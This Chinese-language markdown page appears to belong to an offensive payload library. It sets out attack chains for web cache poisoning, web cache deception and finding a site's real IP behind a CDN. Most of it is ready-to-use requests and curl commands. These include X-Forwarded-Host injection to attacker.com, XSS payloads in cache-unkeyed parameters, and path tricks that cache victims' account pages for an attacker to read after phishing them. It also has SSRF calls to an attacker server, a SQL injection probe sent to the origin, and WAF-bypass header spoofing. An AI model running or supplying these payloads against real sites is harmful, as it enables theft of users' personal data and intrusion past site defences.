# 缓存投毒 / 缓存欺骗 / CDN 绕过 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:Web Cache Poisoning(unkeyed header 注入) / Web Cache Deception(路径混淆) / CDN 源站绕过。Varnish / Cloudflare / Fastly / Akamai 都试。

---


### 缓存投毒  `cache-poisoning`
Web缓存投毒攻击
子类：**缓存投毒** · tags: `cache` `poisoning` `web-cache`

**前置条件：** 目标使用缓存；缓存键配置不当

**攻击链：**

**1. 探测缓存**
_探测缓存状态_
```
响应头: X-Cache: hit/miss
```

**2. 未键入头**
_注入未键入头_
```
X-Forwarded-Host: attacker.com
```

**3. 缓存投毒**
_投毒缓存_
```
GET /?q=test HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

**4. Fat GET**
_Fat GET投毒_
```
GET / HTTP/1.1
Host: target.com
Content-Length: 10

q=poisoned
```

**WAF/EDR 绕过变体：**

**1. 未键入头部(Unkeyed Headers)利用**
_识别不包含在缓存键中但影响响应内容的HTTP头(如X-Forwarded-Host)，通过重复发送携带恶意头的请求将投毒响应存入缓存_
```
# 常见未键入头:
X-Forwarded-Host: attacker.com
X-Forwarded-Scheme: http
X-Original-URL: /malicious
X-Forwarded-Prefix: /evil

# 发现未键入头:
# 使用Param Miner Burp扩展自动检测
# 手动对比: 添加头后响应是否变化但缓存键相同

# 投毒步骤:
# 1. 发送带恶意头的请求直到缓存命中
# 2. 验证其他用户访问同一URL时收到投毒响应
```

**2. 参数伪装与HTTP/2专属头投毒**
_利用UTM等追踪参数不被缓存键包含的特性注入恶意内容，或使用Fat GET请求体覆盖查询参数，HTTP/2独有伪头触发差异化处理_
```
# 参数伪装(Parameter Cloaking):
# UTM参数通常不在缓存键中:
/page?utm_content=<script>alert(1)</script>
/page?callback=alert(1)&utm_source=x

# Fat GET投毒:
GET /api/data HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

q=<script>alert(1)</script>

# HTTP/2专属头:
:method: GET
:path: /
transfer-encoding: chunked
```

---

### 缓存欺骗  `cache-deception`
利用Web缓存和服务器路径解析的差异，诱导CDN/缓存层缓存包含敏感信息的动态页面
子类：**Deception** · tags: `cache` `deception` `auth`

**前置条件：** 目标使用CDN或反向代理缓存；路径解析存在差异(后端忽略路径后缀)；缓存策略基于URL扩展名

**攻击链：**

**1. 探测缓存行为**  _[linux]_
_检测目标的缓存层和缓存策略配置_
```
# 检测是否存在缓存层:
curl -sI "http://target.com/" | grep -iE "x-cache|cf-cache|age:|via:|x-cdn|cache-control"

# 测试缓存策略(静态文件是否被缓存):
curl -sI "http://target.com/test.css" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.js" | grep -iE "x-cache|age"
curl -sI "http://target.com/test.jpg" | grep -iE "x-cache|age"

# 对比动态页面:
curl -sI "http://target.com/account" | grep -iE "x-cache|age|cache-control"
```

**2. 路径混淆缓存欺骗**
_在动态页面URL后附加静态文件扩展名触发缓存_
```
# 核心技巧: 在动态页面URL后添加静态文件扩展名
# 后端将 /account/profile.css 解析为 /account (忽略不存在的路径)
# 缓存层看到 .css 扩展名，认为是静态资源并缓存

# 步骤1: 构造欺骗URL(以受害者身份访问)
curl -b "session=VICTIM_SESSION" "http://target.com/account/profile.css"

# 步骤2: 攻击者无需认证直接访问缓存内容
curl "http://target.com/account/profile.css"

# 多种路径变体:
curl "http://target.com/account/x.js"
curl "http://target.com/account/x.jpg"
curl "http://target.com/account/x.png"
curl "http://target.com/api/user/info/x.css"
curl "http://target.com/settings/x.svg"
```

**3. 高级缓存欺骗变体**
_利用路径分隔符、参数和规范化差异的高级缓存欺骗_
```
# 分隔符混淆(不同组件对路径分隔符理解不同):
curl "http://target.com/account;x.css"
curl "http://target.com/account%23x.css"
curl "http://target.com/account%3fx.css"

# 参数污染:
curl "http://target.com/account?cb=123.css"
curl "http://target.com/account/..%2fstatic/x.css"

# RPO (Relative Path Overwrite):
curl "http://target.com/account/..%2f..%2fstatic/style.css"

# Normalization差异:
curl "http://target.com/account/./x.css"
curl "http://target.com/account%2fx.css"
```

**4. 完整攻击流程验证**
_演示从诱导缓存到窃取数据的完整攻击链_
```
# 完整攻击演示:

# 1. 先确认动态页面包含敏感信息:
curl -b "session=VALID_SESSION" "http://target.com/account" | grep -i "email|phone|address|token"

# 2. 诱导受害者访问欺骗URL(通过钓鱼邮件/消息):
# 受害者点击: http://target.com/account/avatar.jpg
# 这会将其/account页面(含个人信息)缓存为"图片"

# 3. 攻击者访问同一URL获取缓存的敏感信息:
curl "http://target.com/account/avatar.jpg"
# 返回受害者的账户页面(包含邮箱、手机号、地址等)

# 4. 验证缓存命中:
curl -sI "http://target.com/account/avatar.jpg" | grep -i "x-cache"
# 期望看到: X-Cache: HIT
```

**WAF/EDR 绕过变体：**

**1. 路径分隔符混淆**
_利用缓存服务器与源站对分号、换行、井号等分隔符解析不一致触发缓存_
```
# 利用缓存服务器对路径分隔符的差异解析
https://target.com/account/settings;.css
https://target.com/account/settings%0a.css
https://target.com/account/settings%23.css
https://target.com/account/settings%3f.css

# URL编码分隔符
https://target.com/account/settings%2f.css
https://target.com/account/settings%5c.css
```

**2. RPO相对路径覆盖**
_利用相对路径覆盖（RPO）使浏览器请求敏感页面但缓存服务器按静态资源缓存_
```
# Relative Path Overwrite
https://target.com/account/settings/..%2f..%2fstatic/style.css
https://target.com/account/settings/nonexistent.css

# 路径参数注入
https://target.com/account/settings;param=value/test.css
https://target.com/account/settings/test.js?_=1

# 不同缓存键操控
https://target.com/account/settings HTTP/1.1
X-Original-URL: /static/style.css
```

**3. 缓存与源站规范化差异**
_利用CDN/反向代理与源站对URL规范化处理的差异，使缓存误缓存敏感内容_
```
# Cloudflare/Varnish路径规范化差异
https://target.com/account/settings/.css
https://target.com/account/settings/test.avif
https://target.com/account/settings/x.woff2

# 双斜杠混淆
https://target.com//account//settings.css
https://target.com/account/settings%252f.css

# 利用Vary头缺失
curl -H "Accept: text/css" https://target.com/account/settings
```

---

### CDN绕过  `cdn-bypass`
绕过CDN查找真实IP
子类：**CDN** · tags: `cdn` `bypass` `recon`

**前置条件：** 目标使用CDN

**攻击链：**

**1. 历史DNS**
_查找未使用CDN时的IP_
```
# DNS历史记录查询获取真实IP:
# 1. SecurityTrails(需要API Key):
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | jq '.records[].values[].ip'

# 2. ViewDNS:
curl -s "https://viewdns.info/iphistory/?domain=target.com"

# 3. DNS DB在线查询:
# https://dnsdb.io/
# https://securitytrails.com/
# https://completedns.com/

# 4. Censys搜索:
curl -s "https://search.censys.io/api/v2/hosts/search?q=target.com"   -u "API_ID:API_SECRET"

# 5. 使用FOFA:
# domain="target.com" && type="A"

# 6. 多地Ping对比:
nslookup target.com 8.8.8.8
nslookup target.com 1.1.1.1
```

**2. 邮件头**
_查看邮件源码中的Received头_
```
# 通过邮件头泄露真实IP:
# 1. 触发目标站点发送邮件(注册/找回密码/订阅):
curl -d "email=attacker@gmail.com" "http://target.com/forgot-password"
curl -d "email=attacker@gmail.com" "http://target.com/subscribe"

# 2. 查看收到邮件的原始头(Gmail: 显示原始邮件):
# 查找以下字段中的IP:
# Received: from mail.target.com (203.0.113.50)
# X-Originating-IP: [203.0.113.50]
# Return-Path: <noreply@target.com>

# 3. 使用swaks发送邮件触发:
swaks --to attacker@gmail.com --from test@target.com --server target.com

# 4. 分析邮件头:
# 最底部的Received字段通常包含源服务器真实IP

# 5. 如果目标有RSS订阅:
# 订阅后查看请求来源IP
curl "http://target.com/rss" -v
```

**3. DNS历史与证书透明度查询**
_通过DNS历史、证书透明度、搜索引擎查找CDN背后的真实IP_
```
# 1. DNS历史记录查询:
# SecurityTrails:
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a"   -H "APIKEY: YOUR_KEY" | python3 -m json.tool

# 在线查询:
# https://viewdns.info/iphistory/?domain=target.com
# https://completedns.com/dns-history/
# https://dnshistory.org/dns-records/target.com

# 2. 证书透明度日志(CT Log):
curl -s "https://crt.sh/?q=target.com&output=json" |   python3 -c "import json,sys; [print(x['common_name'],x['name_value']) for x in json.load(sys.stdin)]"

# 3. Censys搜索:
# https://search.censys.io/search?q=services.tls.certificates.leaf.names%3Atarget.com

# 4. FOFA/Shodan搜索:
# FOFA: cert="target.com"
# Shodan: ssl.cert.subject.cn:target.com
```

**4. 子域名与相关服务探测真实IP**  _[linux]_
_通过子域名、邮件记录、主动连接等方式发现真实IP_
```
# 1. 子域名可能未经CDN:
for sub in mail ftp ssh vpn dev staging test api admin mx; do
  ip=$(dig +short ${sub}.target.com A 2>/dev/null | head -1)
  [ -n "$ip" ] && echo "${sub}.target.com → $ip"
done

# 2. MX记录(邮件服务器通常不走CDN):
dig +short target.com MX
dig +short $(dig +short target.com MX | awk '{print $2}') A

# 3. SPF记录中的IP:
dig +short target.com TXT | grep -i "spf"
# v=spf1 ip4:203.0.113.50 include:... → 203.0.113.50可能是真实IP

# 4. 触发目标服务器主动连接:
# 在目标网站留下一个URL(如头像、webhook)指向自己的服务器
# 查看连接IP(这是目标的出站IP，通常是真实IP):
# nc -lvp 8888

# 5. SSRF利用:
# 如果存在SSRF漏洞，让服务器连接外部获取IP
curl "http://target.com/api/fetch?url=http://your-server.com/log-ip"
```

**5. 验证真实IP并直接访问**  _[linux]_
_验证候选IP并直接访问绕过CDN防护_
```
# 1. 验证候选IP是否是真实服务器:
REAL_IP="203.0.113.50"

# 直接IP访问(Host头指定域名):
curl -sI "http://${REAL_IP}/" -H "Host: target.com"

# HTTPS访问(忽略证书):
curl -sk "https://${REAL_IP}/" -H "Host: target.com"

# 2. 对比响应确认:
cdn_resp=$(curl -s "https://target.com/" | md5sum)
direct_resp=$(curl -sk "https://${REAL_IP}/" -H "Host: target.com" | md5sum)
echo "CDN: $cdn_resp"
echo "Direct: $direct_resp"
[ "$cdn_resp" = "$direct_resp" ] && echo "[+] CONFIRMED: Real IP!"

# 3. 修改hosts绕过CDN测试:
echo "${REAL_IP} target.com" | sudo tee -a /etc/hosts

# 4. 直接对真实IP进行渗透(绕过CDN的WAF):
nmap -sV -p 1-65535 ${REAL_IP}
# CDN的WAF通常只保护CDN入口，直接访问真实IP可绕过
```

**WAF/EDR 绕过变体：**

**1. 绕过CDN WAF的多种技术**
_利用真实IP和非标端口绕过CDN的WAF防护_
```
# 找到真实IP后，CDN的WAF就被完全绕过了
# 但如果目标自身也有WAF，还需要:

# 1. 使用真实IP直接访问(绕过CDN WAF):
curl -sk "https://REAL_IP/vulnerable?id=1' OR 1=1--" -H "Host: target.com"

# 2. 如果CDN仅对常见端口做WAF:
# 扫描非标端口的Web服务:
nmap -sV -p 8080,8443,8888,9090,3000,4443,8000 REAL_IP

# 3. IPv6绕过(CDN可能只保护IPv4):
dig +short target.com AAAA
curl -6 "http://[IPv6_ADDRESS]/" -H "Host: target.com"

# 4. 源站IP白名单探测:
# 某些源站配置了仅允许CDN IP访问
# 尝试伪造CDN的IP:
curl -H "CF-Connecting-IP: 1.2.3.4" "http://REAL_IP/" -H "Host: target.com"
curl -H "X-Forwarded-For: CDN_IP" "http://REAL_IP/" -H "Host: target.com"
```


---

← 回 [00-index.md](00-index.md) · 相关:Host Header 注入见 00-index §3.9 / §5
